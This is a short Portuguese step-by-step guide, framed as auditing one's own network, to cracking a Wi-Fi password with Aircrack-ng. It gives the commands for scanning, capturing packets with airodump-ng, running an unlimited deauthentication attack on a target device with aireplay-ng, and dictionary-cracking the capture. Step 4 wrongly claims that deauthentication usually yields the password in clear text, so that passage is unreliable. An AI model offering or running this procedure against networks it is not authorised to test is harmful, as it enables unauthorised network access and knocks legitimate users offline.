1. Primeiro, você precisará instalar o Aircrack-ng em seu sistema operacional. Você pode fazer isso digitando o seguinte comando no terminal:
```
sudo apt-get install aircrack-ng
```
2. Em seguida, você precisará escanear a sua rede wireless para encontrar o endereço MAC do roteador e o nome da rede (SSID).
Você pode fazer isso digitando o seguinte comando:
```
sudo iwlist wlan0 scan
```
3. Após identificar o endereço MAC e SSID da sua rede, você pode iniciar o processo de auditoria usando o comando airodump-ng.
Esse comando irá capturar pacotes da sua rede wireless e salvar em um arquivo chamado "captura.cap"
```
sudo airodump-ng --bssid [endereço_MAC_do_roteador] -c [canal_da_rede] -w captura wlan0
```
4. Depois de capturar pacotes, você pode usar o comando aireplay-ng para injetar pacotes na sua rede e forçar dispositivos conectados a autenticar novamente.
Isso geralmente permite capturar a senha da rede em texto claro.
```
sudo aireplay-ng --deauth 0 -a [endereço_MAC_do_roteador] -c [endereço_MAC_do_dispositivo_alvo] wlan0
```
5. Por fim, você pode usar o comando aircrack-ng para quebrar a senha da rede. Esse comando irá comparar os pacotes capturados com uma lista de palavras-chave conhecida (dicionário).
```
sudo aircrack-ng captura.cap -w [dicionario.txt]
```
